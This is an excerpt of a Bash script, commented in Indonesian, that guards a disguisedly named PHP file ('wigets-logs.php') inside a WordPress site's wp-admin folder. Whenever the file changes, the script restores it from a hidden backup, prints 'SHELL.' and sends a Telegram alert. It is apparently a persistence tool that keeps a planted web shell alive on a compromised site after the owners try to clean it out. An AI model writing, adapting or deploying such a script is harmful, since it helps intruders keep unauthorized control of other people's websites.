...
INDEX_FILE="/home/patchada14/public_html/wp-admin/includes/wigets-logs.php"
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/home/patchada14/public_html/wp-admin/images/"
...
monitor_file() {
    while true; do
        ...
        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            ...
            echo "SHELL."
            send_telegram_notification "https://www.patchadams.org/wp-admin/includes/wigets-logs.php. File wigets-logs.php Sudah dikembalikan ke versi backup." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
        fi
